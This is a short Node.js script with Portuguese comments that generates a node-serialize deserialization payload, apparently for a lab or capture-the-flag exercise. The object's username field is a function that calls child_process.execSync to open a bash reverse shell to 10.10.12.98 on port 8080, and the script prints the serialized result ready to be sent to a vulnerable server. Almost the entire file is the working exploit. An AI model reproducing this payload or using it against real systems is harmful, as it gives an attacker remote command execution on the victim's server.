const nodeserialize = require("node-serialize");

let user = {} // Estamos criando um objeto
user.id = "177936891145.66727";
user.username = function teste(){require("child_process").execSync("/bin/bash -c \"/bin/sh -i >& /dev/tcp/10.10.12.98/8080 0>&1\"");return "teste@teste.com"}
console.log(nodeserialize.serialize(user))

/*
child_process -> Lib builtin para executar comando no nodejs
execSync -> Executar o comando e espera o output
*/